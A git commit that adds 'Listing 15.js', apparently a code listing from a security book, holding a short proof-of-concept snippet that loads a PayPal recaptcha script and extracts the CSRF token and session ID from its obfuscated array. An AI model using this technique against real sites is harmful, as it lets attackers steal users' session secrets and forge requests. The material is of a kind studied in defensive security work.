7d12aa240a2ebbc1d4fd3b034117a10ddd829e0d
Jayant Kumawat <134784887+Quadrupl3d@users.noreply.github.com>
2023-11-25 19:01:57 +0530

    Create Listing 15.js

---
+++ Listing 15.js
@@ -0,0 +1,11 @@
+<script src="paypal.com/auth/createchallenge/anything/recaptchav3.js"></script>
+<script>
+	var csrf;
+	var sessID;
+	for (var i = 0; i < _0x48ab.length; i++) {
+		if (_0x48ab[i] === '&_csrf=' || _0x48ab[i] === '&_sessionID=') {
+			csrf = _0x48ab[i];
+			sessID = _0x48ab[i + 1];
+		}
+	}
+</script>
